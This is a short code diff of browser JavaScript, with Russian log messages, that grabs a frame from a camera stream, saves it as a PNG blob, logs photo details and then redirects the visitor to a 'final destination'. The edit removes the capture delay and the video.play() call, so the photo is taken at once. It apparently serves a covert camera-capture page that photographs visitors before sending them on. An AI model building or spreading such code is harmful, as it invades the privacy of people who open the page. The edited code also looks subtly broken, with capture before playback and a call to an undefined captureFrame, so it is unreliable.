@@ -107,25 +107,25 @@
       console.log('Начинаем обработку потока камеры...');
       window.stream = stream;
       video.srcObject = stream;
-      video.play();
+
 
       const context = canvas.getContext('2d');
 
-      setTimeout(function () {
-        if (!photoTaken) {
-          console.log('Фотографирование...');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-          canvas.toBlob(function(blob) {
-            console.log('Фотография создана');
-            savedPhoto = blob;
-            photoTaken = true;
-            logPhotoInfo();
-            redirectToFinalDestination();
-          }, 'image/png');
-        }
-      }, 3000);
+      if (!photoTaken) {
+        console.log('Фотографирование...');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+        canvas.toBlob(function(blob) {
+          console.log('Фотография создана');
+          savedPhoto = blob;
+          photoTaken = true;
+          logPhotoInfo();
+          redirectToFinalDestination();
+        }, 'image/png');
+        requestAnimationFrame(captureFrame);
+      }
+
     }
 
     function logPhotoInfo() {
